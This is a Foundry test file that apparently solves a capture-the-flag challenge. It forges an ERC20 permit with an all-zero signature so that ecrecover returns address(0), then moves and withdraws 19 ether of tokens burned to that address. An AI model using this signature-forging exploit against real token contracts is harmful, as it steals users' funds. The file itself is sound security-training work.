// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Setup, Coin} from "./challenge/Setup.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    Setup setup;

    function setUp() public {
        vm.deal(playerAddr, 1 ether);
        setup = new Setup{value: 20 ether}();
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        new Exploit(address(setup));

        vm.stopPrank();

        assertTrue(setup.isSolved());
    }
}

contract Exploit {
    constructor(address setupAddr) {
        Setup setup = Setup(setupAddr);
        setup.register();
        Coin coin = setup.coin();
        // address(0) に burn されている
        // ecrecover は無効な署名には address(0) を返す
        coin.permit({
            owner: address(0),
            spender: address(this),
            value: 19 ether,
            deadline: block.timestamp + 1 days,
            v: uint8(0),
            r: bytes32(0),
            s: bytes32(0)
        });
        coin.transferFrom(address(0), address(this), 19 ether);
        coin.withdraw(19 ether);
    }
}
